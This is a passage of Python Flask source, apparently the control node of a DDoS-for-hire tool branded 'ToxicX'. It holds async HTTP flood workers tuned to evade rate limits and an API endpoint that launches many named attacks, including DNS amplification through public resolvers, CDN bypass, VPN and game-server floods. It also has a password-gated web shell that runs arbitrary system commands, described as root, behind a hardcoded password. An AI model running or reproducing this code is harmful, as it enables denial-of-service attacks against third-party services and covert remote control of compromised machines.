                headers = random.choice(headers_pool)
                async with session.request(method, url, headers=headers, timeout=timeout) as resp:
                    await resp.read()
            except:
                pass
            await asyncio.sleep(0.0005)

    num_workers = min(200, (os.cpu_count() or 4) * 20)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(worker(session)) for _ in range(num_workers)]
        await asyncio.gather(*tasks)

def http_browser_worker(ip, port, method, duration, attack_id):
    try:
        asyncio.run(http_browser_async(ip, port, method, duration))
    finally:
        dec_process_count()

# ========== HTTP async worker (existing) ==========
async def send_http_request(session, url, method):
    profile = random.choice(BROWSER_PROFILES)
    headers = profile.copy()
    try:
        async with session.request(method, url, headers=headers) as response:
            await response.read()
    except:
        pass

import aiohttp
import asyncio
import time
import random

async def http_worker_async(ip, port, method, duration):
    import aiohttp, asyncio, random, time
    
    url = f"http://{ip}:{port}" if not ip.startswith("http") else ip
    
    # 1. 커넥터 최적화
    connector = aiohttp.TCPConnector(
        limit=5000,                # 최대 동시 연결 수 (ulimit -n 확인 필요)
        limit_per_host=2000,
        ttl_dns_cache=600,
        ssl=False,
        force_close=False,         # Keep-Alive 사용
        enable_cleanup_closed=True,
        keepalive_timeout=30
    )
    
    # 2. 헤더 풀 미리 준비 (Connection: keep-alive)
    headers_pool = [{**p, "Connection": "keep-alive"} for p in BROWSER_PROFILES]
    timeout = aiohttp.ClientTimeout(total=5, connect=2, sock_read=3)
    
    async def worker(session):
        end = time.time() + duration
        # 3. 루프 내에서 최소한의 지연 (레이트 리밋 회피 + CPU 부하 방지)
        while time.time() < end:
            try:
                headers = random.choice(headers_pool)
                async with session.request(method, url, headers=headers, timeout=timeout) as resp:
                    await resp.read()      # 응답 본문 읽기 (커넥션 재사용 위해)
            except:
                pass
            # 4. 미세 지연 (0.5ms~1ms) – 초당 1000~2000 요청/워커
            await asyncio.sleep(0.0005)
    
    # 5. 워커 수 = CPU 코어 * 10 ~ 20 (예: 8코어 → 80~160)
    num_workers = min(200, (os.cpu_count() or 4) * 20)
    
    # 6. 단일 세션 공유 (커넥션 재사용 극대화)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(worker(session)) for _ in range(num_workers)]
        await asyncio.gather(*tasks)

def http_worker(ip, port, method, duration, attack_id):
    try:
        asyncio.run(http_worker_async(ip, port, method, duration))
    finally:
        dec_process_count()

# ========== API endpoint ==========
@app.route('/api/load', methods=['POST'])
def start_load():
    data = request.get_json()
    ip = data.get('ip')
    port = int(data.get('port')) if data.get('port') else None
    duration = int(data.get('duration'))
    method = data.get('method').upper()
    concurrency = int(data.get('concurrency', 1))
    vpn_type = data.get('vpn_type', 'auto')
    target_url = data.get('url')  # for TLS/CF/HTTP2 methods
    power_percent = float(data.get('power_percent', 1.0))  

    attack_id = str(uuid.uuid4())
    processes = []
    base_process_multiplier = 2
    total_processes = base_process_multiplier * concurrency

    # ----- New Methods Routing -----
    try:
        if method == 'TCP-BYPASS':
            total_processes = multiprocessing.cpu_count() * concurrency
            for _ in range(total_processes):
                p = multiprocessing.Process(target=tcp_bypass_worker, args=(ip, port, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)
        
        elif method == 'OVH':
            total_processes = multiprocessing.cpu_count() * concurrency
            for _ in range(total_processes):
                p = multiprocessing.Process(target=message_worker, args=(ip, port, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)
                
        elif method == 'UDP-BYPASS':
            total_processes = multiprocessing.cpu_count() * concurrency
            for _ in range(total_processes):
                p = multiprocessing.Process(target=udp_bypass_worker, args=(ip, port, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)
                
        elif method == 'HTTP2':
            url = target_url or (f"https://{ip}:{port}" if port and port != 80 else f"http://{ip}")
            total_processes = multiprocessing.cpu_count() * concurrency
            for _ in range(total_processes):
                p = multiprocessing.Process(target=http2_flood_worker, args=(url, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)

        # ----- Legacy Existing Methods -----
        elif method == 'UDP-GBPS':
            for _ in range(total_processes):
                p = multiprocessing.Process(target=udp_gbps_worker, args=(ip, port, duration, attack_id, power_percent))
                p.start()
                inc_process_count()
                processes.append(p)
        elif method == 'UDP-PPS':
            for _ in range(total_processes):
                p = multiprocessing.Process(target=udp_pps_worker, args=(ip, port, duration, attack_id, power_percent))
                p.start()
                inc_process_count()
                processes.append(p)
        elif method == 'VSE':
            for _ in range(total_processes):
                p = multiprocessing.Process(target=vse_worker, args=(ip, port, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)
        elif method == 'MINECRAFT':
            for _ in range(total_processes):
                p = multiprocessing.Process(target=minecraft_worker, args=(ip, port, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)
        elif method == 'TCP':
            for _ in range(total_processes):
                p = multiprocessing.Process(target=tcp_worker, args=(ip, port, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)
        elif method == 'DISCORD':
            total_processes = multiprocessing.cpu_count() * concurrency
            for _ in range(total_processes):
                p = multiprocessing.Process(target=discord_flood_worker, args=(ip, port, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)
        elif method == 'VPN-KILL':
            total_processes = multiprocessing.cpu_count() * concurrency * 2
            for _ in range(total_processes):
                p = multiprocessing.Process(target=vpn_kill_worker, args=(ip, port, duration, attack_id, vpn_type))
                p.start()
                inc_process_count()
                processes.append(p)
        elif method == 'DNS-AMP':
            dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "208.67.222.222", "208.67.220.220", "9.9.9.9"]
            total_processes = multiprocessing.cpu_count() * concurrency
            for _ in range(total_processes):
                p = multiprocessing.Process(target=dns_amp_worker, args=(ip, dns_servers, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)
        elif method == 'GAME':
            for _ in range(total_processes):
                p = multiprocessing.Process(target=game_flood_worker, args=(ip, port, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)
        elif method == 'HOME':
            for _ in range(total_processes):
                p = multiprocessing.Process(target=home_flood_worker, args=(ip, port, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)
        elif method == 'TLS':
            url = target_url or f"https://{ip}:{port}" if port != 80 else f"http://{ip}:{port}"
            total_processes = multiprocessing.cpu_count() * concurrency
            for _ in range(total_processes):
                p = multiprocessing.Process(target=tls_flood_worker, args=(url, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)
        elif method == 'TLS+':
            url = target_url or f"https://{ip}:{port}" if port != 80 else f"http://{ip}:{port}"
            total_processes = multiprocessing.cpu_count() * concurrency
            for _ in range(total_processes):
                p = multiprocessing.Process(target=tlsplus_flood_worker, args=(url, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)
        
        elif method == 'TCP-SYN':
            total_processes = multiprocessing.cpu_count() * concurrency
            for _ in range(total_processes):
                p = multiprocessing.Process(target=tcp_syn_worker, args=(ip, port, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)

        elif method == 'TCP-ACK':
            total_processes = multiprocessing.cpu_count() * concurrency
            for _ in range(total_processes):
                p = multiprocessing.Process(target=tcp_ack_worker, args=(ip, port, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)

        elif method == 'STOMP':
            total_processes = multiprocessing.cpu_count() * concurrency
            for _ in range(total_processes):
                p = multiprocessing.Process(target=stomp_worker, args=(ip, port, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)

        elif method == 'SOCKET':
            total_processes = multiprocessing.cpu_count() * concurrency
            for _ in range(total_processes):
                p = multiprocessing.Process(target=socket_raw_worker, args=(ip, port, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)

        elif method == 'HANDSHAKE':
            total_processes = multiprocessing.cpu_count() * concurrency
            for _ in range(total_processes):
                p = multiprocessing.Process(target=handshake_worker, args=(ip, port, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)


        elif method == 'HTTP-BROWSER':
            total_processes = multiprocessing.cpu_count() * concurrency
            for _ in range(total_processes):
                p = multiprocessing.Process(target=http_browser_worker, args=(ip, port, 'GET', duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)



        elif method == 'CF':
            url = target_url or f"http://{ip}:{port}" if ip else ip
            total_processes = multiprocessing.cpu_count() * concurrency
            for _ in range(total_processes):
                p = multiprocessing.Process(target=cf_bypass_worker, args=(url, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)

        elif method in ['GET', 'POST']:
            # Plain HTTP (고정 헤더)
            for _ in range(total_processes):
                p = multiprocessing.Process(target=http_plain_worker, args=(ip, port, method, duration, attack_id))
                p.start()
                inc_process_count()
                processes.append(p)
        active_attacks[attack_id] = processes
        return jsonify({"status": "success", "attack_id": attack_id, "message": f"{method} attack started"})
    except Exception as e:
        # 예외 발생 시 이미 실행된 프로세스 정리
        for p in processes:
            if p.is_alive():
                p.terminate()
                p.join(timeout=1)
        dec_process_count(delta=len(processes))
        return jsonify({"status": "error", "message": f"Failed to spawn processes: {str(e)}"}), 503



@app.route('/api/stop', methods=['POST'])
def stop_load():
    req = request.get_json() or {}
    attack_id = req.get('attack_id')
    if attack_id and attack_id in active_attacks:
        processes = active_attacks.pop(attack_id)
        for p in processes:
            if p.is_alive():
                p.terminate()
                p.join(timeout=1)
        return jsonify({"status": "stopped", "attack_id": attack_id})
    else:
        for aid, procs in list(active_attacks.items()):
            for p in procs:
                if p.is_alive():
                    p.terminate()
                    p.join(timeout=0.5)
            del active_attacks[aid]
        return jsonify({"status": "stopped_all"})

app.secret_key = secrets.token_hex(16)  # 세션 암호화 키

# 접속 비밀번호 (하드코딩, 필요시 변경)
PANEL_PASSWORD = "ppppo17325@@"

# 로그인 페이지 HTML
LOGIN_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ToxicX Panel - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0f1d 0%, #0c1222 100%);
            font-family: 'Segoe UI', 'Courier New', monospace;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container {
            background: rgba(18, 24, 43, 0.9);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 40px;
            width: 350px;
            border: 1px solid rgba(0, 240, 255, 0.3);
            box-shadow: 0 0 30px rgba(0, 240, 255, 0.1);
        }
        h2 {
            text-align: center;
            color: #00f0ff;
            margin-bottom: 30px;
            font-weight: 600;
            letter-spacing: 2px;
            text-transform: uppercase;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: #0a0f1d;
            border: 1px solid #00f0ff;
            border-radius: 8px;
            color: white;
            font-size: 14px;
            outline: none;
            transition: 0.2s;
        }
        input:focus {
            box-shadow: 0 0 10px #00f0ff;
        }
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #00f0ff, #0a6cff);
            border: none;
            border-radius: 8px;
            color: black;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            margin-top: 15px;
            transition: 0.2s;
        }
        button:hover {
            transform: scale(1.02);
            box-shadow: 0 0 15px #00f0ff;
        }
        .error {
            color: #ff2a5f;
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>⚡ TOXICX PANEL</h2>
        <form method="post" action="/panel/login">
            <input type="password" name="password" placeholder="Enter Password" autofocus>
            <button type="submit">ACCESS</button>
        </form>
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
    </div>
</body>
</html>
'''

# 웹 셸 인터페이스 HTML (터미널 스타일)
SHELL_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ToxicX Web Shell</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0f1d;
            font-family: 'Courier New', 'Fira Code', monospace;
            height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 20px;
        }
        .header {
            background: #1e2640;
            padding: 12px 20px;
            border-radius: 12px;
            border-bottom: 2px solid #00f0ff;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .title {
            color: #00f0ff;
            font-weight: bold;
            font-size: 18px;
            letter-spacing: 2px;
        }
        .logout {
            color: #ff2a5f;
            text-decoration: none;
            background: rgba(255,42,95,0.2);
            padding: 6px 12px;
            border-radius: 6px;
            transition: 0.2s;
        }
        .logout:hover {
            background: #ff2a5f;
            color: white;
        }
        .terminal {
            flex: 1;
            background: #050814;
            border-radius: 12px;
            border: 1px solid #00f0ff;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }
        .output {
            flex: 1;
            padding: 15px;
            overflow-y: auto;
            color: #b0f0ff;
            font-size: 14px;
            line-height: 1.5;
            white-space: pre-wrap;
            font-family: monospace;
        }
        .input-line {
            display: flex;
            border-top: 1px solid #00f0ff;
            background: #0a0f1d;
        }
        .prompt {
            color: #00f0ff;
            padding: 12px;
            font-weight: bold;
            background: #0a0f1d;
            user-select: none;
        }
        #cmdInput {
            flex: 1;
            background: transparent;
            border: none;
            color: white;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            padding: 12px;
            outline: none;
        }
        button {
            background: #00f0ff;
            border: none;
            color: black;
            padding: 0 20px;
            cursor: pointer;
            font-weight: bold;
            transition: 0.2s;
        }
        button:hover {
            background: #0a6cff;
            color: white;
        }
        ::-webkit-scrollbar {
            width: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #0a0f1d;
        }
        ::-webkit-scrollbar-thumb {
            background: #00f0ff;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="title">🐱 TOXICX ROOT SHELL</div>
        <a href="/panel/logout" class="logout">EXIT</a>
    </div>
    <div class="terminal">
        <div class="output" id="output"># Welcome to ToxicX Web Shell (root privileges)<br># Type commands below.<br></div>
        <div class="input-line">
            <span class="prompt">$&nbsp;</span>
            <input type="text" id="cmdInput" autofocus placeholder="command...">
            <button id="runBtn">▶ RUN</button>
        </div>
    </div>
    <script>
        const output = document.getElementById('output');
        const cmdInput = document.getElementById('cmdInput');
        const runBtn = document.getElementById('runBtn');

        function appendOutput(text) {
            output.innerHTML += text + '<br>';
            output.scrollTop = output.scrollHeight;
        }

        async function executeCommand(cmd) {
            if (!cmd.trim()) return;
            appendOutput('<span style="color:#00f0ff">$ ' + escapeHtml(cmd) + '</span>');
            cmdInput.value = '';
            try {
                const res = await fetch('/panel/shell', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cmd: cmd })
                });
                const data = await res.json();
                if (data.error) {
                    appendOutput('<span style="color:#ff2a5f">Error: ' + escapeHtml(data.error) + '</span>');
                } else {
                    appendOutput(escapeHtml(data.output));
                }
            } catch(e) {
                appendOutput('<span style="color:#ff2a5f">Request failed: ' + e + '</span>');
            }
        }

        function escapeHtml(str) {
            return str.replace(/[&<>]/g, function(m) {
                if (m === '&') return '&amp;';
                if (m === '<') return '&lt;';
                if (m === '>') return '&gt;';
                return m;
            });
        }

        runBtn.addEventListener('click', () => executeCommand(cmdInput.value));
        cmdInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') executeCommand(cmdInput.value);
        });
    </script>
</body>
</html>
'''

@app.route('/panel', methods=['GET'])
def panel_login_page():
    if session.get('authenticated'):
        return SHELL_HTML
    return render_template_string(LOGIN_HTML, error=None)

@app.route('/panel/login', methods=['POST'])
def panel_login():
    password = request.form.get('password')
    if password == PANEL_PASSWORD:
        session['authenticated'] = True
        return SHELL_HTML
    else:
        return render_template_string(LOGIN_HTML, error='Invalid password')

@app.route('/panel/logout')
def panel_logout():
    session.pop('authenticated', None)
    return redirect('/panel')

@app.route('/panel/shell', methods=['POST'])
def panel_shell():
    if not session.get('authenticated'):
        return jsonify({'error': 'Unauthorized'}), 401
    data = request.get_json()
    cmd = data.get('cmd', '').strip()
    if not cmd:
        return jsonify({'output': ''})
    try:
        # root 권한으로 실행 (현재 프로세스가 root이면 자동)
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if not output:
            output = '(no output)'
        return jsonify({'output': output})
    except subprocess.TimeoutExpired:
        return jsonify({'output': 'Command timed out (30s)'})
    except Exception as e:
        return jsonify({'error': str(e)})
def main():
    global manager
    global active_attacks
    global global_process_count
    manager = Manager()
    active_attacks = manager.dict()     # 기존 dict 대신 manager.dict()로 교체 (선택)
    global_process_count = manager.Value('i', 0)
    app.run(host='0.0.0.0', port=5001, debug=False, threaded=True)

@app.route('/api/status', methods=['GET'])
def system_status():
    status = load_monitor.get_status()
    return jsonify(status)

if __name__ == '__main__':
    main()